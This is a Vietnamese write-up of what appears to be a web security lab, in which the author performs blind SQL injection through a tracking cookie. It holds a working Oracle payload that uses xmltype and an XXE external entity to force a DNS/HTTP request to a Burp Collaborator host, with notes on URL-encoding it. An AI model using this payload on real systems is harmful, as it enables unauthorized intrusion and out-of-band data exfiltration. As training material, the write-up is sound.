<img width="1507" height="852" alt="image" src="https://github.com/user-attachments/assets/c1d53106-f279-47ff-b637-c24fa93b4b4c" />

Yêu cầu: thực hiện 1 cái `DNS lookup` tới `Burp Collaborator`

Gợi ý: Có thể thực thi query trên tracking cookie nhưng phía server sẽ không trả về bất kỳ respone nào và không có tí effect nào trên respone. Nhưng có thể giao tiếp với doamin bên ngoài.

<img width="2563" height="960" alt="image" src="https://github.com/user-attachments/assets/713c713a-0732-4857-a692-f73e60c376de" />

Thì với Tracking Cookie như trên thì ta sẽ thử bằng payload này để thử `DNS lookup` vào `Burp Collaborator`:

    '||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//kl9tn8vrqnjbfibamufrvwf7qywpkf84.oastify.com/">+%25remote%3b]>'),'/l')+
    FROM+dual)||'

Payload này tận dụng hàm xmltype trong Oracle để kích hoạt lỗ hổng XXE (XML External Entity). Bằng cách khai báo một thực thể ngoại vi (External Entity), ta có thể ép máy chủ thực hiện các hành vi 
trái phép, cụ thể ở đây là tạo một SSRF (Server-Side Request Forgery) để ping về máy chủ của chúng ta.

Và subdomain `Burp Collaborator` cung cấp là `kl9tn8vrqnjbfibamufrvwf7qywpkf84.oastify.com` và chú ý là phải mã hóa lại đoạn payload bên trong để đề phòng lỗi như trong payload có `;` thì tôi phải mã
hóa thành `%3B` để nó không tách đoạn phía sau `;` thành 1 cookie khác.

<img width="2559" height="1383" alt="image" src="https://github.com/user-attachments/assets/4e0d3181-75b3-4b3d-9ddd-cdbb657e7972" />

sau khi gửi payload như trên thì tôi phát hiện ra ở bên `Burp Collaborator` đã bắt được `DNS request` tới

<img width="2563" height="1129" alt="image" src="https://github.com/user-attachments/assets/08872440-d2cb-45dd-ac86-32890860f2ad" />

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/0efc3194-73c2-4b08-9df0-ffe3ab2b6db1" />
